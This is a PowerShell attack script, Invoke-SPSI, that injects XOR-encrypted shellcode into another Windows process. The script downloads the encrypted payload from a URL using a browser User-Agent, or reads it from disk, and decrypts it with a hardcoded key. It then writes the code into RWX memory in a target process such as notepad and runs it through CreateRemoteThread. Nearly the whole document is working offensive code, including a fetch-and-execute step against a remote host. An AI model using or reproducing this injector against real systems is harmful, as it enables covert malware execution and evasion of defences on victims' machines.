<#
.SYNOPSIS
    Inject XOR-encrypted shellcode into a target process.

.DESCRIPTION
    Invoke-SPSI downloads or reads an XOR-encrypted payload, decrypts it with the given key,
    and injects it into the specified process.

.PARAMETER Url
    (ParameterSet Web) URL to download the encrypted payload from.

.PARAMETER File
    (ParameterSet File) Local path to the encrypted payload file.

.PARAMETER Key
    Hex string key to XOR-decrypt the payload.

.PARAMETER TargetProcess
    Name of the process to inject into (default: notepad).

.EXAMPLE
    # via web
    Invoke-SPSI -Url 'http://…/test.enc' -Key 'f62f…' -TargetProcess notepad

.EXAMPLE
    # via file
    Invoke-SPSI -File 'C:\payload.bin' -Key 'f62f…' -TargetProcess notepad

#>

function Invoke-SPSI {
    [CmdletBinding(DefaultParameterSetName='Web')]
    param(
        [Parameter(ParameterSetName='Web', Mandatory=$true)]
        [string]$Url,
        [Parameter(ParameterSetName='File', Mandatory=$true)]
        [string]$File,
        [string]$Key           = 'f62f054feab9fc06424fa3a2795d7286',
        [string]$TargetProcess = 'notepad'
    )

    function Convert-HexStringToByteArray {
        param ([string]$HexString)
        $h = ($HexString -replace '[^0-9A-Fa-f]','')
        if ($h.Length % 2) { throw "Hex key length must be even." }
        $b = New-Object byte[] ($h.Length/2)
        for ($i=0; $i -lt $h.Length; $i+=2) {
            $b[$i/2] = [Convert]::ToByte($h.Substring($i,2),16)
        }
        $b
    }
    function Invoke-XOR {
        param ([byte[]]$Data, [byte[]]$Key)
        $out = New-Object byte[] $Data.Length
        for ($i=0; $i -lt $Data.Length; $i++) {
            $out[$i] = $Data[$i] -bxor $Key[$i % $Key.Length]
        }
        $out
    }

    Write-Host "`n# SPS Injector @p1papupa`n" -ForegroundColor Cyan

    # fetch or read payload
    if ($PSCmdlet.ParameterSetName -eq 'Web') {
        Write-Host "[+] Downloading from $Url"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent','Mozilla/5.0')
        try { $enc = $wc.DownloadData($Url) }
        catch { Write-Error "Download failed: $_"; return }
    } else {
        Write-Host "[+] Reading file $File"
        try { $enc = [IO.File]::ReadAllBytes($File) }
        catch { Write-Error "Read failed: $_"; return }
    }
    Write-Host "[+] Encrypted size: $($enc.Length) bytes"

    # decrypt
    [byte[]]$keyBytes = Convert-HexStringToByteArray -HexString $Key
    Write-Host "[+] Decrypting..."
    [byte[]]$shellcode = Invoke-XOR -Data $enc -Key $keyBytes
    Write-Host "[+] Decrypted size: $($shellcode.Length) bytes"

    # ensure target process
    $proc = Get-Process -Name $TargetProcess -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $proc) {
        Write-Host "[!] $TargetProcess not running. Launching..."
        Start-Process $TargetProcess; Start-Sleep 2
        $proc = Get-Process -Name $TargetProcess -ErrorAction SilentlyContinue |
                Where-Object { $_.MainWindowHandle -ne 0 } | Select-Object -First 1
        if (-not $proc) { Write-Error "Failed to launch $TargetProcess"; return }
    }
    $targetpid = $proc.Id
    Write-Host "[+] Target: $TargetProcess (PID: $targetpid)"

    
    $sig = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll",SetLastError=true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll",SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll",SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out uint written);
    [DllImport("kernel32.dll",SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@
    if (-not [type]::GetType("Win32", $false, $false)) {
        Add-Type -TypeDefinition $sig -Language CSharp
    }

    # inject
    $ACC    = 0x1F0FFF; $COM  = 0x3000; $RWX = 0x40
    $h = [Win32]::OpenProcess($ACC, $false, $targetpid)
    if ($h -eq [IntPtr]::Zero) { Write-Error "OpenProcess failed"; return }
    $addr = [Win32]::VirtualAllocEx($h, [IntPtr]::Zero, [uint32]$shellcode.Length, $COM, $RWX)
    if ($addr -eq [IntPtr]::Zero) { Write-Error "VirtualAllocEx failed"; return }
    [uint32]$written = 0
    [Win32]::WriteProcessMemory($h, $addr, $shellcode, [uint32]$shellcode.Length, [ref]$written) | Out-Null
    [Win32]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
    Write-Host "[+] Injected $written bytes into $TargetProcess."
}
# example
#Invoke-SPSI -url http://127.0.0.1:8080/calc.enc -key f62f054feab9fc06424fa3a2795d7286 -TargetProcess notepad
